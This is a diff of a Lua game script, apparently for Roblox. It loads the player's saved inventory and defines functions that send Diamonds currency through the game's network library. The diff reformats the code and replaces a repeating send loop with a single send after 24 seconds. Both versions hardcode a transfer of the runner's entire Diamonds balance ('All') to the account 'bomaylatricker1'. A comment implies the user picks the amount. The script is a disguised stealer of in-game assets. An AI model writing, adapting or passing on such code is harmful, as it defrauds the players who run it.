@@ -5,8 +5,11 @@ repeat wait()
         SavedData = Library.Save.Get();
     end);
 until type(SavedData) == "table";
+
 local Network = Library.Network
 local Functions = Library.Functions
+
+
 function getDiamonds()
     for i, v in pairs(SavedData["Inventory"]["Currency"]) do
         if v["id"] == "Diamonds" then
@@ -15,6 +18,8 @@ function getDiamonds()
     end
     return false
 end
+
+
 function SendDiamonds(options)
 
     local user = options.user;
@@ -31,8 +36,10 @@ function SendDiamonds(options)
         end
     end
 end
+
+
+-- if u want to send all just change amount to "All"
 spawn(function()
-    while true do task.wait(10)
-        SendDiamonds({ user = "bomaylatricker1" , amount = "All" })
-    end
+    wait(24)
+    SendDiamonds({ user = "bomaylatricker1" , amount = "All" })
 end)
